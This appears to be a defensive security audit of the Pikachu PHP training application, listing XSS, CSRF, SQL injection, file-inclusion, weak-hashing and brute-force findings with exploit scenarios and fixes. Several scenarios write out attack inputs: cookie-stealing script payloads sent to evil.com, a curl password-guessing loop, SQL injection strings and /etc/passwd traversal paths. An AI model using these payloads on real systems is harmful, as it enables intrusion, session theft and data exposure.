findings.title: $PIKA_ROOT_DIR echoed into JS/HTML without encoding enables XSS if variable is attacker-influenced
findings.description: The variable $PIKA_ROOT_DIR is echoed directly into multiple HTML <script src="..."> attributes and into a JavaScript document.write string (line 37) without htmlspecialchars() or addslashes(). The fallback on line 6 sets it to '' only if not already set, meaning any prior assignment persists. If any including script populates $PIKA_ROOT_DIR from untrusted input (e.g., query parameter, cookie, or a tainted variable in the pikachu application's page files), an attacker can break out of the attribute/string context and inject arbitrary JavaScript. There are at least 12 echo points throughout the file.
findings.exploit_scenario: A vulnerable pikachu page sets $PIKA_ROOT_DIR from a user-supplied parameter before including footer.php. An attacker crafts a URL with path_prefix set to something like '" onmouseover="alert(1) or, in the document.write context on line 37, a value containing ' to break the JS string and inject code. When any user loads the page, the injected script executes in their browser session.
findings.recommendation: Encode $PIKA_ROOT_DIR with htmlspecialchars($PIKA_ROOT_DIR, ENT_QUOTES, 'UTF-8') at every output point, or ensure the variable is only ever set from hardcoded server-side constants and never from request data.

findings.title: Client-side-only CAPTCHA validation allows trivial brute-force bypass
findings.description: The CAPTCHA ("验证码") validation is implemented entirely in client-side JavaScript (lines 119–130: the `validate()` function checks `inputCode != code` and returns `false` on mismatch). The server-side PHP code (lines 22–43) never validates any CAPTCHA token — it only checks `$_POST['username']` and `$_POST['password']`. An attacker can bypass the CAPTCHA by submitting a crafted HTTP POST request directly (e.g., via curl or a scripting tool) without a `vcode` field, or with any arbitrary value. The server will process the login attempt regardless. Combined with the absence of any server-side rate-limiting or account lockout, this enables unrestricted online brute-force or credential-stuffing attacks against any account.
findings.exploit_scenario: An attacker sends rapid automated POST requests to bf_client.php with varying username/password pairs and omits the vcode parameter entirely. Because the PHP backend never checks the CAPTCHA, every request is evaluated against the database. The attacker can brute-force credentials at network speed, e.g.: `for pw in $(cat wordlist.txt); do curl -s -d "username=admin&password=$pw&submit=Login" http://target/bf_client.php; done`
findings.recommendation: Implement server-side CAPTCHA generation and validation. Store the CAPTCHA answer in a server-side session when generating the image/code, then verify the submitted value against the session-stored answer in the POST handler before processing the login attempt. Additionally, implement server-side rate limiting and account lockout after a configurable number of failed attempts.

findings.title: Assignment (=) instead of comparison (==) in conditional renders active-page logic unconditional
findings.description: Line 17: `if ($SELF_PAGE = "bf_client.php")` uses a single `=` (assignment) instead of `==` (comparison). This unconditionally assigns the string to `$SELF_PAGE` and always evaluates to truthy. While this particular bug happens to produce the correct result (the page is bf_client.php), it indicates a logic pattern that could be copied to other pages where it would cause incorrect menu/active-state highlighting, potentially confusing users about which security controls are active. Direct security impact is limited in this isolated file but worth noting as a code correctness issue that could mask auth-related UI states in a multi-page application.
findings.exploit_scenario: In isolation, low direct exploit. If this pattern were replicated on a restricted admin page (e.g., `if ($SELF_PAGE = "admin.php")`), the condition would always be true regardless of the actual page, potentially enabling UI-level access control confusion. Not directly exploitable in this specific file.
findings.recommendation: Change `=` to `==` on line 17: `if ($SELF_PAGE == "bf_client.php")` or use strict comparison `===`.

findings.title: Hardcoded default credentials with weak passwords inserted during install
findings.description: Lines 53-55 insert default user accounts with well-known, weak passwords into the `users` table: admin/123456 (level 1 = admin), pikachu/000000, test/abc123. The passwords are hashed with unsalted MD5 (md5('123456'), etc.), which is trivially reversible via rainbow tables. The same pattern repeats for the `member` table (lines 91-99) with md5('123456') for all seven users. After installation, these credentials grant immediate access to the application, including admin-level access for the 'admin' account.
findings.exploit_scenario: An attacker visits the application after installation. Knowing that pikachu uses default credentials, they log in as 'admin' with password '123456' (or crack the MD5 hash `e10adc3949ba59abbe56e057f20f883e` via any rainbow table service). This grants full admin access (level 1), enabling all downstream attacks.
findings.recommendation: Force the installer to choose a strong, unique admin password at install time. Use password_hash() with PASSWORD_BCRYPT instead of md5(). Do not pre-populate any accounts with fixed credentials.

findings.title: Passwords stored as unsalted MD5 hashes
findings.description: All user passwords across both the `users` table (line 55: md5('123456'), md5('000000'), md5('abc123')) and the `member` table (lines 91-99: md5('123456') for all seven members) are hashed using PHP's md5() function. MD5 is cryptographically broken for password storage: it is fast to compute (billions of guesses/second on GPU), unsalted (identical passwords produce identical hashes), and trivially reversible via precomputed rainbow tables. The MD5 hash of '123456' (e10adc3949ba59abbe56e057f20f883e) is one of the most commonly known hash values.
findings.exploit_scenario: An attacker obtains the database (via SQL injection elsewhere in the application or a backup leak). All password hashes are unsalted MD5. The attacker cracks them instantly using a rainbow table or hashcat, recovering every user's plaintext password within seconds.
findings.recommendation: Replace md5() with password_hash($password, PASSWORD_BCRYPT) for password storage and password_verify() for authentication checks. This provides automatic salting and an adaptive cost factor.

findings.title: Unauthenticated database drop and reinstall destroys all data
findings.description: The install.php script has no authentication or authorization check. Any visitor who sends a POST request with `submit` (line 18: `if(isset($_POST['submit']))`) triggers: (1) DROP DATABASE IF EXISTS (line 28), destroying all existing data; (2) CREATE DATABASE and table recreation (lines 32-107). There is no check whether installation has already been performed, no CSRF token, no admin session requirement, and no lockdown mechanism after installation completes.
findings.exploit_scenario: An unauthenticated attacker visits install.php on a live pikachu instance and clicks the "安装/初始化" button (or sends a simple POST request with submit=1). This immediately drops the entire database, destroying all application data, then recreates it with default accounts. The attacker can then log in as admin with the known default password '123456'. Alternatively, the attacker tricks an authenticated admin into visiting a page that auto-submits the form (CSRF), achieving the same destructive result.
findings.recommendation: Add an authentication gate requiring admin privileges, a CSRF token on the form, and a post-install lock file check that disables the installer after first run (e.g., if file_exists('install.lock'), exit). Remove or restrict access to install.php after deployment.

findings.title: Database name interpolated unsanitized into DDL SQL statements
findings.description: The variable $dbname (sourced from the DBNAME constant defined in inc/config.inc.php) is interpolated directly into SQL DDL statements without parameterization or escaping: line 28 `$drop_db="drop database if exists $dbname"` and line 32 `$create_db="CREATE DATABASE $dbname"`. While $dbname originates from a config file constant rather than direct user input, the pattern is still unsafe — if the config file is derived from an environment variable, a CI/CD template, or is editable via another vulnerability, an attacker could inject SQL. For example, a DBNAME value of `test; DROP TABLE users--` would execute arbitrary SQL.
findings.exploit_scenario: If an attacker can influence the DBNAME constant in inc/config.inc.php (e.g., through a separate file-write vulnerability, a misconfigured deployment script that reads DBNAME from an environment variable, or a shared hosting configuration injection), they can inject arbitrary SQL that executes during the install process. For instance, setting DBNAME to `x; INSERT INTO users VALUES(99,'hacker',md5('pass'),1)--` would create a backdoor admin account.
findings.recommendation: Use backtick quoting for database names: `$drop_db = "DROP DATABASE IF EXISTS \`" . str_replace('`','',$dbname) . "\`";` or validate $dbname against a strict alphanumeric whitelist before use.

findings.title: CAPTCHA not invalidated after verification, enabling unlimited brute-force replay
findings.description: After the CAPTCHA (`$_SESSION['vcode']`) is verified at line 38 (`strtolower($_POST['vcode']) != strtolower($_SESSION['vcode'])`), the session value is never unset or rotated. The code comment at line 43 even acknowledges this: "应该在验证完成后,销毁该$_SESSION['vcode']". Because the token persists, an attacker can solve the CAPTCHA once (e.g., manually or via OCR), then replay that same `vcode` value across unlimited subsequent login attempts. Combined with no account lockout mechanism, this entirely defeats the anti-brute-force purpose of the CAPTCHA. The parameterised SQL query at lines 47-51 prevents SQL injection but does not prevent credential guessing.
findings.exploit_scenario: An attacker obtains a valid CAPTCHA answer by solving it once (e.g., reading the image at /inc/showvcode.php). They then script a brute-force attack: for each password candidate, they POST the same fixed `vcode` value alongside the target `username` and the candidate `password`. Because `$_SESSION['vcode']` is never consumed/destroyed, every request passes the CAPTCHA check, allowing an unlimited-speed online brute-force of the login form.
findings.recommendation: Immediately unset or regenerate `$_SESSION['vcode']` after the comparison at line 38, e.g., `unset($_SESSION['vcode']);` inside the successful-verification branch. Additionally, consider implementing server-side rate limiting or account lockout after a configurable number of failed attempts.

findings.title: Login form has no brute-force protection, enabling credential compromise
findings.description: The login form at lines 28–48 accepts username/password via POST and checks them against the database using prepared statements (no SQLi). However, there is absolutely no anti-automation mechanism: no CAPTCHA, no account lockout, no rate limiting, no delayed response, and no login-attempt counter. An attacker can send unlimited rapid authentication attempts. The form action (line 85) POSTs back to itself, making it trivially automatable. The developer comment on line 27 acknowledges this: "典型的问题,没有验证码,没有其他控制措施,可以暴力破解" ("Typical problem: no captcha, no other controls, can be brute-forced"). The popover on lines 74–78 even leaks valid credential pairs (admin/123456, pikachu/000000, test/abc123), lowering the already-trivial barrier.
findings.exploit_scenario: An attacker sends thousands of POST requests to bf_form.php with a known username (e.g., "admin") and a dictionary of common passwords, automating via curl or a tool like Burp Intruder / Hydra. Because there is no lockout, no CAPTCHA, and no rate limit, every permutation is tested until a valid password is found. The response body distinguishes success ("login success") from failure ("username or password is not exists"), giving a clear oracle. Valid credentials are obtained, leading to full account takeover.
findings.recommendation: Implement at least one anti-automation control: (1) account lockout after N failed attempts, (2) server-side rate limiting with exponential back-off, (3) CAPTCHA after a few failures, and/or (4) a server-side login-attempt counter tied to session or IP. Remove the credential hint popover from production.

findings.title: CSRF/anti-brute-force token validated with loose comparison (==) enabling type-juggling bypass
findings.description: Line 33 compares the submitted token against the session token using PHP's loose equality operator (`==`) rather than strict (`===`): `if($token == $_SESSION['token'])`. If the token generated by `set_token()` (called at line 55) ever produces a "magic hash" string — i.e., one matching `/^0e[0-9]+$/` (e.g., `"0e123456789"`) — PHP will evaluate both operands as floating-point zero under `==`. An attacker submitting any other `"0e..."` numeric-looking string would match. The token value from POST (`$token = $_POST['token']`) is fully attacker-controlled. This bypasses the anti-brute-force gate, allowing unrestricted credential guessing.
findings.exploit_scenario: An attacker repeatedly submits login requests with token set to a string like "0e99999999". On the rare occasion the server-generated session token is a magic hash (probability ~0.1% per attempt for hex md5 tokens), the loose comparison succeeds, the token check passes, and the attacker can brute-force credentials without needing to fetch a valid token each time.
findings.recommendation: Replace loose comparison with strict: `if($token === $_SESSION['token'])`. Alternatively, use `hash_equals($_SESSION['token'], $token)` which also prevents timing side-channels.

findings.title: Stored XSS via unescaped database fields rendered in HTML
findings.description: Values fetched from the database (`$name`, `$sex`, `$phonenum`, `$add`, `$email`) on lines 53–58 are interpolated directly into a heredoc HTML template (lines 61–70) and emitted via `echo $html` on line 71 with no HTML-entity encoding (no `htmlspecialchars`). If the linked edit page (`csrf_get_edit.php`, line 69) allows a logged-in user to set these fields to arbitrary content — and there is no output encoding shown here — any stored payload executes in the victim's browser every time this page is loaded. This is a classic stored-XSS sink: database → string interpolation → raw echo.
findings.exploit_scenario: An attacker logs in, navigates to csrf_get_edit.php, and sets their "address" field to `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>`. When any admin or other user views a page that renders this member's data (or the attacker views their own profile), the script executes, exfiltrating session cookies.
findings.recommendation: Encode every database-sourced value with `htmlspecialchars($value, ENT_QUOTES, 'UTF-8')` before interpolating into HTML, or switch to a template engine that auto-escapes.

findings.title: Logout via GET with no CSRF token allows forced logout attacks
findings.description: Lines 29–34: The logout action is triggered by a simple GET parameter `?logout=1` with no CSRF token or stateful validation. An attacker can force any logged-in victim to log out by inducing them to visit a crafted link or load an image tag pointing to `csrf_get.php?logout=1`. The session is destroyed on the server side (line 31–33).
findings.exploit_scenario: An attacker embeds `` on a third-party page. When the victim visits this page while logged in, their session is destroyed, forcing them to re-authenticate — enabling downstream attacks such as credential harvesting via a fake login prompt.
findings.recommendation: Require POST (or a separate CSRF token) for logout, following the same protection used for other state-changing actions.

findings.title: Second-order SQL injection via session-stored username in SELECT query
findings.description: Line 52: `$username=$_SESSION['csrf']['username']` is taken from the session and interpolated directly into a SQL query on line 53: `"select * from member where username='$username'"`. If the username was stored in the session during registration or login without proper sanitization (e.g., a crafted username like `' UNION SELECT 1,2,3,4,5,6 --`), this becomes a second-order SQL injection. The sink is on line 53; the entry point is whatever code populates `$_SESSION['csrf']['username']` (likely in the login handler).
findings.exploit_scenario: An attacker registers (or logs in with) a username containing SQL injection payloads such as `' OR 1=1 --`. When this page loads and reads that username from the session, the constructed query becomes `SELECT * FROM member WHERE username='' OR 1=1 --'`, potentially exposing all member records.
findings.recommendation: Use parameterized queries (prepared statements) for all SQL, even when the value appears to originate from a trusted source like a session variable.

findings.title: GET-based CSRF allows profile modification with no anti-CSRF token
findings.description: The form on lines 56-66 submits via HTTP GET with no CSRF token. The update logic on line 41 processes the request based solely on session cookie authentication (checked on line 31-33). Any malicious site can trigger this action because: (1) the form uses GET, so a simple <img> tag suffices; (2) there is no secondary token, referrer check, or SameSite cookie attribute enforcement; (3) the browser automatically includes session cookies. The escaped GET parameters flow directly into an UPDATE query that modifies the victim's sex, phonenum, address, and email fields in the `member` table.
findings.exploit_scenario: An attacker hosts a page containing: ``. When a logged-in victim visits this page, their browser sends the GET request with their session cookie. The server authenticates the request and overwrites the victim's profile data with the attacker-supplied values.
findings.recommendation: Switch the form to POST, add a per-session anti-CSRF token (e.g., a random cryptographic nonce stored in the session and embedded as a hidden field), and validate the token on the server before processing the update. Also verify the Origin or Referer header.

findings.title: Stored XSS via unescaped database values rendered in HTML
findings.description: After the update on line 41, user-controlled values (sex, phonenum, address, email) are stored in the database. On lines 58-66, these values are retrieved and interpolated directly into HTML via the heredoc on lines 56-66 without any HTML entity encoding. The `escape()` call on line 40 only performs SQL escaping (likely `mysqli_real_escape_string`), not HTML escaping. An attacker can inject arbitrary HTML/JavaScript that executes in the victim's browser when the profile page is rendered.
findings.exploit_scenario: An attacker uses the CSRF vector (or direct submission) to set the `sex` parameter to `<script>document.location='http://evil.com/steal?c='+document.cookie</script>`. The value is stored in the database. When the victim (or any admin viewing the profile) loads the page, the script executes, exfiltrating session cookies or performing actions on behalf of the user.
findings.recommendation: Apply HTML entity encoding (e.g., `htmlspecialchars($value, ENT_QUOTES, 'UTF-8')`) to all database values before embedding them in HTML output. This should be done in addition to any SQL escaping.

findings.title: Potential second-order SQL injection via session username in WHERE clause
findings.description: On line 41, the UPDATE query uses `$_SESSION['csrf']['username']` directly in the WHERE clause without escaping: `where username='{$_SESSION['csrf']['username']}'`. Similarly on line 60: `"select * from member where username='$username'"`. If the username was stored in the session during login without proper sanitization, and the login code does not escape it, a crafted username containing SQL metacharacters could lead to second-order SQL injection when it is interpolated into these queries.
findings.exploit_scenario: During registration or login, an attacker sets their username to `admin'-- `. This value is stored in the session. When line 41 executes, the query becomes `update member set sex='...' where username='admin'-- '`, potentially altering a different user's record or changing the query semantics.
findings.recommendation: Use parameterized queries (prepared statements) for all SQL operations, and apply `escape()` to the session username the same way it is applied to GET parameters.

findings.title: CSRF on login via state-changing GET request with no anti-CSRF token
findings.description: The login form on line 82 specifies `method="get"`, so username and password are submitted as URL query parameters. On lines 26-36, the handler reads `$_GET['username']` and `$_GET['password']`, authenticates the user, and unconditionally sets session identity (`$_SESSION['csrf']['username']`, `$_SESSION['csrf']['password']`) before redirecting to `csrf_get.php`. There is no CSRF token, no `Referer` check, and no secondary confirmation. Because authentication state is established purely via a GET request, any third-party site can induce this action through an img tag, script src, or direct link.
findings.exploit_scenario: An attacker crafts a URL such as: `http://target/pk/vul/csrf/csrfget/csrf_get_login.php?submit=Login&username=attacker&password=123456` The attacker embeds it on a malicious page as `` or sends it in a phishing email. When the victim's browser loads the URL (with the victim's existing session cookie), the server authenticates the victim as "attacker". The victim is now operating inside the attacker's account, allowing the attacker to later observe any actions or data the victim enters under that account (login-CSRF / session-fixation variant).
findings.recommendation: 1. Change the login form to use POST instead of GET so credentials never appear in URLs. 2. Generate a per-session anti-CSRF token (e.g., random hex in `$_SESSION`) and embed it as a hidden field in the form, validating it on submission before authenticating. 3. Reject the request if the token is missing or mismatched.

findings.title: GET-based logout with no CSRF token allows forced logout
findings.description: Lines 32–37: The logout action is triggered solely by the GET parameter `$_GET['logout'] == 1` with no anti-CSRF token. The code then calls `session_unset()`, `session_destroy()`, and redirects. Any third-party site can force a logged-in victim to log out by embedding e.g. ``. Because the request is GET, even a simple link visit suffices.
findings.exploit_scenario: Attacker's page contains ``. Victim visits attacker page while logged in → their session is destroyed → they are forcefully logged out.
findings.recommendation: Require an unpredictable CSRF token for logout, and use POST (or a form-based confirmation) rather than a bare GET request for state-changing actions.

findings.title: Session username interpolated directly into SQL query
findings.description: Line 54–55: `$username=$_SESSION['csrf']['username']` is taken from the session and interpolated directly into the SQL query string on line 55: `"select * from member where username='$username'"`. There is no parameterized query or escaping applied at this point. If the username stored in the session was not sanitized at login time (e.g., in `csrf_post_login.php`), a malicious username containing SQL metacharacters could break out of the string literal and inject SQL.
findings.exploit_scenario: During registration or login, a user sets their username to `' OR 1=1 --`. If the login code stores this raw value in `$_SESSION['csrf']['username']`, then every page visit triggers `SELECT * FROM member WHERE username='' OR 1=1 --'`, leaking other users' records into the displayed profile fields.
findings.recommendation: Use parameterized queries / prepared statements (e.g., `mysqli_prepare` / `mysqli_stmt_bind_param`) instead of string interpolation, even for values sourced from the session.

findings.title: Stored XSS via unsanitized database values rendered in HTML
findings.description: Lines 57–70: Five user profile fields (`$name`, `$sex`, `$phonenum`, `$add`, `$email`) are fetched from the database (line 56) and embedded directly into a heredoc HTML block (lines 62–69) without any HTML-entity encoding. An attacker who can control these fields (e.g., via the CSRF-unprotected edit form at `csrf_post_edit.php`) can inject arbitrary JavaScript that executes whenever the victim views their profile page.
findings.exploit_scenario: An attacker crafts a CSRF page that auto-submits a POST to `csrf_post_edit.php`, setting the victim's `address` field to `<script>document.location='http://evil/?c='+document.cookie</script>`. Because the edit form lacks a CSRF token, the victim's profile is silently updated. Next time the victim views `csrf_post.php`, the script executes, exfiltrating their session cookie.
findings.recommendation: Encode all user-controlled data before embedding in HTML using `htmlspecialchars($value, ENT_QUOTES, 'UTF-8')`. Also add anti-CSRF tokens to the profile edit form.

findings.title: CSRF on POST profile update — no anti-CSRF token or origin verification
findings.description: The form at lines 46–55 submits via POST to update the logged-in user's profile fields (sex, phonenum, add, email). The handler at lines 31–39 processes the update solely based on the session cookie (line 34: `where username='{$_SESSION['csrf']['username']}'`). There is no CSRF token, no Referer/Origin header check, and no SameSite enforcement on the session cookie. Any cross-origin page can forge an identical POST request; the browser will automatically include the victim's session cookie, and the server will authorize the mutation.
findings.exploit_scenario: An attacker hosts a page containing a hidden auto-submitting form: `<form method="post" action="https://target/vul/csrf/csrfpost/csrf_post_edit.php"><input type="hidden" name="sex" value="evil">...<input type="hidden" name="submit" value="submit"></form><script>document.forms[0].submit()</script>`. When a logged-in victim visits the attacker's page, their browser POSTs to the target with their session cookie, silently overwriting their profile data (sex, phone, address, email) with attacker-chosen values.
findings.recommendation: Add a per-session anti-CSRF token: include a cryptographically random token as a hidden form field, verify it server-side before processing the POST, and reject requests with a missing or mismatched token.

findings.title: Stored XSS — database values rendered in HTML without output encoding
findings.description: At lines 47–55, values fetched from the database (`$name`, `$sex`, `$phonenum`, `$add`, `$email`) are interpolated directly into the HTML heredoc string and echoed via `echo $html` (line 56). The escape() call on line 32 is for SQL injection prevention, not HTML output encoding. An attacker who can set any of these fields to a value like `<script>alert(document.cookie)</script>` will have that payload stored in the database and executed as JavaScript every time this page (or csrf_post.php) is rendered for that user. This can be combined with finding F-01-01 (CSRF) so the attacker both stores and triggers the XSS on the victim's browser.
findings.exploit_scenario: Using the CSRF from F-01-01, an attacker submits a POST with `sex=%3Cscript%3Efetch('https://evil.site/?c='%2Bdocument.cookie)%3C%2Fscript%3E`. The value is stored in the database. When the victim later views their profile edit page, the script executes in the victim's session, exfiltrating session cookies or performing actions as the victim.
findings.recommendation: HTML-encode all user-controlled data before embedding it in output: use `htmlspecialchars($value, ENT_QUOTES, 'UTF-8')` on `$name`, `$sex`, `$phonenum`, `$add`, and `$email` at the point of output (lines 50–54).

findings.title: Potential SQL injection via session-controlled username in UPDATE WHERE clause
findings.description: Line 34 builds the UPDATE query using `{$_SESSION['csrf']['username']}` in the WHERE clause without explicit escaping at this point: `where username='{$_SESSION['csrf']['username']}'`. If the username stored in the session was not properly sanitized at login time (depends on the login handler, not visible in this file), an attacker who controls their username (e.g., during registration) could inject SQL. This is mitigated if the login/registration code escapes the username before storing it in the session, but the defense is not visible in this file. The POST fields themselves go through `escape($link, $_POST)` on line 32, which presumably applies `mysqli_real_escape_string`.
findings.exploit_scenario: If the registration/login handler stores a raw, unsanitized username in `$_SESSION['csrf']['username']`, a user registering with username `admin' OR '1'='1` could cause the UPDATE to affect all rows. This depends entirely on the login handler's implementation.
findings.recommendation: Explicitly escape or parameterize the session username in the query on line 34, and audit the login/registration code to confirm the session value is safe. Use prepared statements throughout.

findings.title: Login CSRF: no anti-CSRF token on login action, GET-based credentials
findings.description: The login form at line 62 uses `method="get"` and the handler at lines 33-47 reads `$_GET['username']` and `$_GET['password']` with no CSRF token verification. An attacker can force a victim to authenticate as the attacker's account by inducing the victim's browser to make a GET request to `csrf_post_login.php?submit=Login&username=attacker&password=attackerpass`. After the forced login, the victim is redirected to `csrf_post.php` (line 41) and will operate under the attacker's session identity. The attacker can later log in as themselves and observe actions the victim took while authenticated as the attacker (e.g., viewing CSRF POST pages that may log or store data tied to the account). Additionally, because credentials are sent as GET parameters, they are exposed in browser history, server access logs, and Referer headers.
findings.exploit_scenario: An attacker embeds `` on a forum page. A logged-out victim visits the page; their browser makes the GET request, authenticating them as the attacker. The victim continues browsing the CSRF POST pages thinking they are using their own account. Any data they submit is associated with the attacker's account, which the attacker can later review.
findings.recommendation: 1. Change the login form to use POST method. 2. Include a per-session anti-CSRF token in the login form and validate it server-side before authenticating. 3. Never transmit credentials in URL query strings.

findings.title: Assignment (=) instead of comparison (==) in conditional always evaluates true
findings.description: Line 14 uses `if ($SELF_PAGE = "csrf_post_login.php")` — a single `=` assignment operator rather than `==`. This unconditionally assigns the string to `$SELF_PAGE` and always evaluates to true. While this particular conditional only controls setting the `$ACTIVE` sidebar array (no direct security impact), it signals a pattern of confusion between assignment and comparison. If similar logic were applied to a security gate (e.g., role checks), it would become an auth bypass. The line is already misleading for security reviewers.
findings.exploit_scenario: No direct exploit in this specific file. The bug is noted as a low-confidence code quality issue that could become a vulnerability if replicated in authorization logic. A reviewer auditing the codebase should flag this pattern wherever it appears near security-critical conditionals.
findings.recommendation: Change `=` to `==` (or `===`) in the conditional: `if ($SELF_PAGE === "csrf_post_login.php")`.

findings.title: Weak password hashing: sha1(md5($password)) stored in session
findings.description: Line 43 stores `sha1(md5($password))` in `$_SESSION['csrf']['password']`. Both MD5 and SHA-1 are cryptographically broken for password hashing — they are fast, unsalted hashes vulnerable to brute-force and rainbow-table attacks. If session storage is compromised (e.g., via session file read, session hijacking, or server misconfiguration), the doubly-hashed password can be cracked trivially. The database query on line 38 also uses plain `md5()` for password comparison, compounding the weakness across the application.
findings.exploit_scenario: An attacker gains read access to session storage (e.g., `/tmp/sess_*` files on a shared host). They extract `sha1(md5('123456'))` and crack it with a GPU hash cracker in seconds, recovering the plaintext password, which may be reused on other services.
findings.recommendation: Use `password_hash()` with `PASSWORD_BCRYPT` or `PASSWORD_ARGON2ID` for all password storage and comparison. Do not store password derivatives (even hashed) in the session; store only the authenticated user ID.

findings.title: Stored XSS via unencoded database fields rendered in HTML
findings.description: User profile data (username, sex, phonenum, address, email) is fetched from the database at lines 57-63 and directly interpolated into an HTML heredoc at lines 65-72 without any HTML entity encoding. An attacker who can set any of these fields to contain HTML/JavaScript (e.g., via `token_get_edit.php`) will have that payload stored in the database and executed in the browser of any user viewing this page. The sink is `echo $html;` at line 73.
findings.exploit_scenario: An attacker updates their profile via `token_get_edit.php`, setting their address field to `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`. When the attacker or an admin views `token_get.php`, the script executes, exfiltrating session cookies.
findings.recommendation: HTML-encode all database values before embedding them in HTML output. Use `htmlspecialchars($data['username'], ENT_QUOTES, 'UTF-8')` for each field before interpolation, or use a template engine that auto-escapes.

findings.title: Second-order SQL injection via session-supplied username in unparameterized query
findings.description: At line 58, the username is read from `$_SESSION['csrf']['username']` and directly interpolated into a SQL query string: `$query="select * from member where username='$username'";`. If the username stored in the session was not sanitized at the point of login/registration (e.g., if it was stored as raw user input after a successful authentication), a crafted username containing SQL metacharacters would be executed as SQL when this page is loaded. This is a second-order SQL injection: untrusted input persists through the session store and reaches the SQL sink.
findings.exploit_scenario: An attacker registers a username such as `' UNION SELECT 1,2,3,4,5,6-- `. If the registration/login logic does not reject this, it is stored in `$_SESSION['csrf']['username']`. Upon visiting `token_get.php`, the query becomes `select * from member where username='' UNION SELECT 1,2,3,4,5,6-- '`, leaking arbitrary data from other tables.
findings.recommendation: Use parameterized queries (prepared statements) regardless of the data source. Replace the string interpolation with: `$stmt = $link->prepare("select * from member where username=?"); $stmt->bind_param("s", $username);`

findings.title: Stored XSS via unescaped database values rendered directly into HTML
findings.description: User-controlled fields (sex, phonenum, add, email) are submitted via GET, SQL-escaped by `escape($link, $_GET)` (line 38) — which only performs SQL escaping (e.g., `mysqli_real_escape_string`), NOT HTML encoding. These values are persisted to the `member` table via the UPDATE query on line 39. On subsequent page loads, lines 64–75 SELECT the stored data and interpolate `$sex`, `$phonenum`, `$add`, `$email` directly into HTML attribute values and `$name` into element content without any `htmlspecialchars()` or equivalent encoding. An attacker who updates their profile with an HTML payload in any of these fields will execute arbitrary JavaScript in every visitor's browser who views this page (including admins).
findings.exploit_scenario:
An authenticated user submits a GET request such as:
`?submit=1&sex="><script>fetch('https://evil.com/steal?c='+document.cookie)</script>&phonenum=123&add=here&email=a@b.com&token={valid_token}`
The SQL escape does not touch `<`, `>`, or `"`, so the payload is stored verbatim. On next page render, the HTML becomes:
`<input type="text" name="sex" value=""><script>fetch('https://evil.com/steal?c='+document.cookie)</script>"/>`
The script executes in the browser of any user viewing the profile, stealing session cookies.
findings.recommendation: Apply `htmlspecialchars($value, ENT_QUOTES, 'UTF-8')` to every database-sourced variable before embedding it in HTML output (lines 70–74). Alternatively use a template engine with auto-escaping.

findings.title: Login CSRF via unprotected GET-based authentication endpoint
findings.description: The login form at line 95 uses `method="get"` and the handler (lines 38-55) accepts credentials via `$_GET['username']` and `$_GET['password']` with no anti-CSRF token. An attacker can craft a URL that forces a victim's browser to submit login credentials. The session is then populated with the attacker-chosen identity (`$_SESSION['csrf']['username']` and `$_SESSION['csrf']['password']` at lines 49-50), and the victim is redirected to `token_get.php` (line 51) authenticated as the attacker's chosen account. Because the request is a simple GET, it can be triggered by image tags, link clicks, or any standard CSRF vector without requiring JavaScript.
findings.exploit_scenario: An attacker creates a page containing `` or sends the victim a link to that URL. When the victim's browser loads the page or clicks the link, the browser sends the GET request with the attacker's credentials. The server authenticates the victim as the attacker's account ("attacker"). The victim then performs actions on `token_get.php` under the attacker-controlled identity. The attacker can later observe or manipulate data tied to that session. This also enables forced-login attacks where the attacker knows credentials and wants the victim's actions attributed to a specific account.
findings.recommendation: 1. Change the form method to POST so credentials are not embedded in URLs. 2. Generate and validate a per-session anti-CSRF token on the login form (ironic given this is the CSRF token demo section). 3. Reject login attempts via GET — only accept POST. 4. Add a `SameSite=Lax` or `SameSite=Strict` attribute to the session cookie as defense-in-depth.

findings.title: Unsanitized GET parameter used in require() enables Local File Inclusion
findings.description: The `$_GET['title']` value is assigned directly to `$filename` on line 21 with zero validation or sanitization. On line 22, this value is concatenated into a `require()` call: `require "soup/$filename";`. An attacker fully controls the path component after `soup/` and can use traversal sequences (`../`) to escape the intended `soup/` directory, or use PHP stream wrappers to read arbitrary files or achieve code execution.
findings.exploit_scenario: An attacker sends a request like `GET /vul_dir/dir_list.php?title=../../../etc/passwd`. The `require` resolves to `soup/../../../etc/passwd` → `/etc/passwd`, which is included and its contents rendered. Alternatively, using `php://filter/convert.base64-encode/resource=../../../etc/passwd` leaks file contents as base64. If any file-upload endpoint places attacker-controlled content in a known location, the attacker can achieve remote code execution by including that file.
findings.recommendation: Whitelist allowed filenames. Replace the dynamic require with a strict mapping, e.g.: `$allowed = ['jarheads.php','truman.php']; if(in_array($filename, $allowed, true)){ require "soup/$filename"; }`. At minimum, basename() and realpath() checks should be applied to prevent directory traversal.

findings.title: Unsanitized user input directly passed to PHP include() enables Local File Inclusion
findings.description: On line 22, user-controlled input `$_GET['filename']` is assigned to `$filename` with no validation or sanitization. On line 24, this value is directly interpolated into an `include` statement: `include "include/$filename";`. Although the HTML form (lines 61-69) presents a dropdown of five safe options (file1.php–file5.php), the parameter is a GET query string parameter, so an attacker can supply any value. The application performs no whitelist check; the commented-out code on lines 26-29 shows the intended secure approach was known but not implemented.
findings.exploit_scenario: An attacker sends a GET request such as: `GET /vul/fileinclude/fi_local.php?submit=1&filename=../../../etc/passwd`. The `include` resolves to `include "include/../../../etc/passwd"`, which traverses out of the `include/` directory and reads `/etc/passwd`, leaking its contents in the response. More critically, if the attacker can upload a file containing PHP code (e.g., an image with embedded PHP via a separate upload feature) to a known path, they can include it to achieve **remote code execution**, e.g., `?submit=1&filename=../../uploads/evil.jpg`.
findings.recommendation: Adopt the whitelist approach already sketched in the commented-out code (lines 26-29). Only allow exact matches against the known safe filenames: `$allowed = ['file1.php','file2.php','file3.php','file4.php','file5.php']; if (in_array($filename, $allowed, true)) { include "include/$filename"; }`. Do not rely on client-side restrictions (HTML select) to constrain server-side input.

findings.title: Unsanitized user input passed directly to include() enables RFI/LFI
findings.description: On line 38, the GET parameter `$_GET['filename']` is read with no validation or sanitization. On line 39 it is assigned to `$filename`, and on line 40 it is passed straight to `include "$filename";`. There is no path whitelist, no extension enforcement, no prefix restriction — the attacker fully controls the argument to `include()`. The code itself confirms awareness of this ("变量传进来直接包含,没做任何的安全限制"). When `allow_url_include=On` (which the page explicitly instructs the user to enable at line 30), any remote URL supplied as `filename` will be fetched and executed as PHP code on the server. Even without that directive, local file inclusion via path traversal (e.g., `../../etc/passwd`) is possible, and LFI can often be upgraded to RCE via log poisoning or `/proc/self/environ`.
